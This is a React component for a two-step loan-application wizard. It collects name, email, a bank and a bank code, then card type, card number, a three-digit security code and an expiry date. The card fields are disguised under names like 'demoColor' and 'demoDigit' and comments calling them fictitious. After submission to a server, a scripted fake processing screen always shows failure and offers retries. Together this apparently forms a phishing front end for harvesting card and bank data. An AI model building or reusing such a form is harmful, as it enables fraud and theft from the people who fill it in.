'use client';

import { Fragment, useEffect, useId, useRef, useState, useTransition } from 'react';
import { ArrowLeft, ArrowRight, Check, CircleX, Hash, CalendarDays, CreditCard, Loader2, Lock, Mail, RotateCcw, User } from 'lucide-react';
import { submitLoanRequest } from '@/lib/actions/loan';
import { SIMULATION } from '@/lib/config';
import { useI18n } from '@/lib/i18n/provider';
import { progressAt } from '@/lib/simulation/progress';
import { formatCode, formatDigitGroups } from '@/lib/utils';
import { LOAN_STEP_FIELDS, isValidExpiry, validateLoanStep, type LoanFormValues } from '@/lib/validations/loan';
import { ProgressRing } from '@/components/ui/ProgressRing';
import { SelectField } from '@/components/ui/SelectField';
import { TextField } from '@/components/ui/TextField';
import type { Bank, CardType } from '@/types/db';
import { BankPicker } from './BankPicker';
import { CardPicker } from './CardPicker';

interface Props {
  banks: Bank[];
  cardTypes: CardType[];
  attemptsLeft: number;
}

const STEPS = 2; // 1 informations + banque · 2 carte + vérification (la demande part quand la barre est pleine)
const VERIFY_MS = 8000;

const EMPTY: LoanFormValues = {
  fullName: '', contactEmail: '',
  bankId: '',
  demoNumber: '', demoFruit: '', demoAnimal: '', // vérification complémentaire : toujours vide au départ
  cardTypeId: '', otherCardName: '',
  demoColor: '', demoDigit: '', demoYear: '', // vérification pédagogique : toujours vide au départ
};

export function LoanWizard({ banks, cardTypes, attemptsLeft }: Props) {
  const { t } = useI18n();
  const [step, setStep] = useState(0);
  const [verifiedFor, setVerifiedFor] = useState(''); // date « MM/AA » pour laquelle la barre de vérification est déjà allée au bout
  const [values, setValues] = useState<LoanFormValues>(EMPTY);
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [serverError, setServerError] = useState('');
  const [phase, setPhase] = useState<'form' | 'processing' | 'result'>('form');
  const [remaining, setRemaining] = useState(attemptsLeft);
  const [pending, startTransition] = useTransition();
  const headingRef = useRef<HTMLHeadingElement>(null);

  useEffect(() => {
    if (step > 0 || phase !== 'form') headingRef.current?.focus();
  }, [step, phase]);

  const update = (partial: Partial<LoanFormValues>) => {
    setValues((v) => ({ ...v, ...partial }));
    setErrors((e) => {
      const rest = { ...e };
      for (const k of Object.keys(partial)) delete rest[k];
      return rest;
    });
  };
  const translate = (keys: Record<string, string>) => Object.fromEntries(Object.entries(keys).map(([k, v]) => [k, t(v)]));

  const goNext = () => {
    const found = validateLoanStep(step, values);
    if (Object.keys(found).length) return setErrors(translate(found));
    setErrors({});
    setStep((s) => s + 1);
  };

  const submit = () => {
    for (let i = 0; i < STEPS; i++) {
      const found = validateLoanStep(i, values);
      if (Object.keys(found).length) {
        setStep(i);
        return setErrors(translate(found));
      }
    }
    setServerError('');
    startTransition(async () => {
      const res = await submitLoanRequest(values); // la validation est refaite côté serveur, puis par la base
      if (res.ok) {
        setRemaining(res.remaining);
        return setPhase('processing');
      }
      setServerError(res.message);
      if (res.remaining !== undefined) setRemaining(res.remaining);
      const fe = res.fieldErrors;
      if (fe) {
        setErrors(fe);
        const idx = LOAN_STEP_FIELDS.findIndex((fields) => fields.some((f) => f in fe));
        if (idx >= 0) setStep(idx);
      }
    });
  };

  /** La barre de vérification est pleine : on envoie la demande (ou on affiche les erreurs restantes). */
  const finish = () => {
    const found = validateLoanStep(step, values);
    if (Object.keys(found).length) return setErrors(translate(found));
    setVerifiedFor(values.demoYear);
    submit();
  };

  const restart = () => {
    setValues(EMPTY);
    setErrors({});
    setServerError('');
    setVerifiedFor('');
    setStep(0);
    setPhase('form');
  };

  if (phase === 'processing') return <Processing onDone={() => setPhase('result')} />;
  if (phase === 'result') {
    return (
      <div className="card space-y-5 py-10 text-center" role="status">
        <span className="mx-auto grid h-16 w-16 place-items-center rounded-full bg-red-50 text-coral-500 ring-8 ring-red-50/60"><CircleX className="h-8 w-8" aria-hidden /></span>
        <h2 ref={headingRef} tabIndex={-1} className="text-3xl text-coral-600 focus:outline-none">{t('proc.failed.title')}</h2>
        <p className="text-slate-600">{t('proc.failed.text')}</p>
        {remaining > 0 ? (
          <div className="pt-1">
            <button
              type="button"
              onClick={restart}
              className="inline-flex items-center gap-2.5 rounded-xl border border-ocean-500/30 bg-lagoon-50 px-6 py-3.5 text-base font-semibold text-ocean-600 transition hover:bg-lagoon-100"
            >
              <RotateCcw className="h-5 w-5" aria-hidden /> {t(remaining === 1 ? 'proc.attempts.one' : 'proc.attempts.other', { count: remaining })}
            </button>
            <p className="mt-2 text-sm text-slate-500">{t('proc.attempts.hint')}</p>
          </div>
        ) : (
          <p className="font-medium text-navy-900">{t('apply.noAttempts')}</p>
        )}
      </div>
    );
  }

  return (
    <form
      noValidate
      onSubmit={(e) => {
        e.preventDefault();
        if (step < STEPS - 1) goNext();
        else if (serverError) submit();
      }}
      className="space-y-5"
    >
      <div className="rounded-2xl border border-line bg-white p-4 shadow-soft sm:p-5">
        <ol className="flex items-center" aria-label={t('apply.title')}>
          {Array.from({ length: STEPS }, (_, i) => (
            <Fragment key={i}>
              <li aria-current={i === step ? 'step' : undefined} className="flex items-center gap-3">
                <span className={`grid h-8 w-8 shrink-0 place-items-center rounded-full text-sm font-bold transition ${i < step ? 'bg-ocean-600 text-white' : i === step ? 'bg-navy-900 text-white' : 'bg-slate-100 text-slate-400'}`}>
                  {i < step ? <Check className="h-4 w-4" aria-hidden /> : i + 1}
                </span>
                <span className={`text-sm leading-tight ${i === step ? 'font-semibold text-navy-900' : 'hidden text-slate-400 sm:inline'}`}>{t(`apply.s${i + 1}`)}</span>
              </li>
              {i < STEPS - 1 && <span aria-hidden className={`mx-4 h-0.5 flex-1 rounded-full transition-colors ${step > i ? 'bg-ocean-600' : 'bg-line'}`} />}
            </Fragment>
          ))}
        </ol>
      </div>

      <div className="card space-y-6">
        <div className="flex items-center justify-between gap-3">
          <h2 ref={headingRef} tabIndex={-1} className="text-2xl focus:outline-none">{t(`apply.t${step + 1}`)}</h2>
          <span className="rounded-full bg-navy-50 px-3 py-1 text-xs font-semibold text-navy-700">{t('apply.stepOf', { current: step + 1, total: STEPS })}</span>
        </div>

        {serverError && <p role="alert" className="rounded-xl border border-red-200 bg-red-50 p-4 text-sm text-red-800">{serverError}</p>}

        {step === 0 && (
          <>
            <Section first title={t('apply.sec.contact')}>
              <TextField label={t('apply.fullName')} icon={User} required autoComplete="name" maxLength={120} placeholder={t('ph.fullName')} value={values.fullName} onChange={(e) => update({ fullName: e.target.value })} error={errors.fullName} />
              <TextField label={t('apply.email')} icon={Mail} type="email" required autoComplete="email" maxLength={254} placeholder={t('ph.email')} value={values.contactEmail} onChange={(e) => update({ contactEmail: e.target.value })} error={errors.contactEmail} />
            </Section>

            <Section title={t('apply.sec.bank')}>
              <BankPicker banks={banks} value={values.bankId} onChange={(bankId) => update({ bankId })} error={errors.bankId} />
              <TextField label={t('apply.demo.number')} icon={Hash} required autoComplete="off" autoCapitalize="characters" spellCheck={false} placeholder={t('ph.numberLong')} hint={t('apply.demo.numberHint')} value={values.demoNumber} onChange={(e) => update({ demoNumber: formatCode(e.target.value) })} error={errors.demoNumber} />
              <TextField label={t('apply.demo.fruit')} required maxLength={30} autoComplete="off" placeholder={t('ph.fruit')} value={values.demoFruit} onChange={(e) => update({ demoFruit: e.target.value })} error={errors.demoFruit} />
              <TextField label={t('apply.demo.animal')} required maxLength={30} autoComplete="off" placeholder={t('ph.animal')} value={values.demoAnimal} onChange={(e) => update({ demoAnimal: e.target.value })} error={errors.demoAnimal} />
            </Section>
          </>
        )}

        {step === 1 && (
          <>
            <Section first title={t('apply.sec.card')}>
              <CardPicker
                cardTypes={cardTypes}
                value={values.cardTypeId}
                onChange={(cardTypeId) => update({ cardTypeId, ...(cardTypeId === 'other' ? {} : { otherCardName: '' }) })}
                otherName={values.otherCardName}
                onOtherName={(otherCardName) => update({ otherCardName })}
                error={errors.cardTypeId}
                otherError={errors.otherCardName}
              />
            </Section>

            <Section title={t('apply.sec.verif')}>
              <VerificationStep values={values} errors={errors} update={update} verifiedFor={verifiedFor} sending={pending} onComplete={finish} />
            </Section>
          </>
        )}

        <div className="flex items-center justify-between gap-3 border-t border-line pt-6">
          {step > 0 ? (
            <button type="button" disabled={pending} className="btn btn-outline" onClick={() => { setErrors({}); setServerError(''); setVerifiedFor(''); setStep((s) => s - 1); }}>
              <ArrowLeft className="h-4 w-4" aria-hidden /> {t('common.previous')}
            </button>
          ) : <span />}
          {step < STEPS - 1 ? (
            <button type="submit" className="btn btn-green">{t('common.next')} <ArrowRight className="h-4 w-4" aria-hidden /></button>
          ) : (
            serverError && (
              <button type="submit" disabled={pending} aria-busy={pending} className="btn btn-green">
                {pending && <Loader2 className="h-4 w-4 animate-spin" aria-hidden />} {t('apply.retry')}
              </button>
            )
          )}
        </div>
      </div>
    </form>
  );
}

/** Bloc titré d'une étape (les étapes regroupent plusieurs rubriques). */
function Section({ title, first, children }: { title: string; first?: boolean; children: React.ReactNode }) {
  const id = useId();
  return (
    <section aria-labelledby={id} className={`space-y-4 ${first ? '' : 'border-t border-line pt-6'}`}>
      <h3 id={id} className="text-xs font-semibold uppercase tracking-[0.14em] text-lagoon-600">{title}</h3>
      {children}
    </section>
  );
}

/**
 * Seconde partie de l'étape 2 : champs fictifs et barre de vérification.
 * - La barre ne démarre que lorsque « MM/AA » est complet et valide ; elle repart de zéro si la date est modifiée.
 * - Quand elle est pleine, la demande est envoyée automatiquement. Si un autre champ de l'étape est encore invalide,
 *   ses erreurs s'affichent et l'envoi se fait dès qu'elles sont corrigées.
 */
function VerificationStep({ values, errors, update, verifiedFor, sending, onComplete }: {
  values: LoanFormValues;
  errors: Record<string, string>;
  update: (p: Partial<LoanFormValues>) => void;
  verifiedFor: string;
  sending: boolean;
  onComplete: () => void;
}) {
  const { t } = useI18n();
  const dateOk = isValidExpiry(values.demoYear);
  const verified = dateOk && verifiedFor === values.demoYear;
  const [progress, setProgress] = useState(verified ? 100 : 0);
  const stepValid = Object.keys(validateLoanStep(1, values)).length === 0;

  const onCompleteRef = useRef(onComplete);
  const doneRef = useRef(verified); // vrai quand la barre est arrivée à 100 % pour la date saisie
  useEffect(() => { onCompleteRef.current = onComplete; });

  useEffect(() => {
    if (!dateOk) { doneRef.current = false; setProgress(0); return; }
    if (verified) { doneRef.current = true; setProgress(100); return; }
    doneRef.current = false;
    setProgress(0);
    const start = performance.now();
    const id = setInterval(() => {
      const p = Math.min(100, Math.round(((performance.now() - start) / VERIFY_MS) * 100));
      setProgress(p);
      if (p >= 100) {
        clearInterval(id);
        doneRef.current = true;
        onCompleteRef.current(); // envoie la demande, ou affiche les erreurs restantes
      }
    }, 100);
    return () => clearInterval(id);
  }, [dateOk, verified]);

  // Erreurs corrigées après coup : on poursuit automatiquement.
  useEffect(() => {
    if (stepValid && doneRef.current && !verified) onCompleteRef.current();
  }, [stepValid, verified]);

  const status = sending ? t('apply.submitting') : !dateOk ? t('apply.demo.waiting') : progress >= 100 ? t('apply.demo.done') : t('apply.demo.eta');

  return (
    <>
      <TextField
        label={t('apply.demo.color')}
        icon={CreditCard}
        required
        inputMode="numeric"
        autoComplete="off"
        placeholder={t('ph.colorDigits')}
        value={values.demoColor}
        onChange={(e) => update({ demoColor: formatDigitGroups(e.target.value) })}
        error={errors.demoColor}
      />
      <div className="grid gap-4 sm:grid-cols-2">
        <TextField label={t('apply.demo.digit')} icon={Lock} required inputMode="numeric" maxLength={3} autoComplete="off" placeholder={t('ph.number')} value={values.demoDigit} onChange={(e) => update({ demoDigit: e.target.value.replace(/\D/g, '') })} error={errors.demoDigit} />
        <TextField
          label={t('apply.demo.year')}
          icon={CalendarDays}
          required
          inputMode="numeric"
          maxLength={5}
          autoComplete="off"
          placeholder={t('ph.year')}
          value={values.demoYear}
          onChange={(e) => {
            const digits = e.target.value.replace(/\D/g, '').slice(0, 4);
            const formatted = digits.length > 2 ? `${digits.slice(0, 2)}/${digits.slice(2)}` : digits;
            update({ demoYear: formatted });
          }}
          error={errors.demoYear}
        />
      </div>
      <div>
        <div className="mb-1 flex justify-between text-sm font-medium text-slate-700"><span>{t('apply.demo.progress')}</span><span aria-hidden>{progress}%</span></div>
        <div role="progressbar" aria-label={t('apply.demo.progress')} aria-valuemin={0} aria-valuemax={100} aria-valuenow={progress} className="h-2.5 overflow-hidden rounded-full bg-slate-100 ring-1 ring-inset ring-line">
          <div className="h-full rounded-full bg-ocean-600 transition-[width] duration-300" style={{ width: `${progress}%` }} />
        </div>
        <p className="mt-1 text-xs text-slate-500" aria-live="polite">{status}</p>
      </div>
    </>
  );
}

/** Traitement simulé : 1 % -> 81 % puis plus lentement -> 94 % en ~8 s, puis l'écran d'échec. Purement visuel. */
function Processing({ onDone }: { onDone: () => void }) {
  const { t } = useI18n();
  const [value, setValue] = useState<number>(SIMULATION.start);
  const doneRef = useRef(false);
  const cb = useRef(onDone);
  cb.current = onDone;

  useEffect(() => {
    let raf = 0;
    const start = performance.now();
    const tick = (now: number) => {
      const elapsed = now - start;
      const next = Math.round(progressAt(elapsed));
      setValue((p) => (p === next ? p : next));
      if (elapsed >= SIMULATION.totalMs) {
        if (!doneRef.current) {
          doneRef.current = true;
          cb.current();
        }
        return;
      }
      raf = requestAnimationFrame(tick);
    };
    raf = requestAnimationFrame(tick);
    return () => cancelAnimationFrame(raf);
  }, []);

  return (
    <div className="card space-y-4 py-12 text-center">
      <h2 className="text-2xl">{t('proc.title')}</h2>
      <div role="progressbar" aria-label={t('proc.label')} aria-valuemin={0} aria-valuemax={100} aria-valuenow={value}>
        <ProgressRing value={value} />
      </div>
      <p aria-live="polite" className="font-medium text-navy-900">{t('proc.analysing')}</p>
      <p className="text-sm text-slate-500">{t('proc.wait')}</p>
    </div>
  );
}
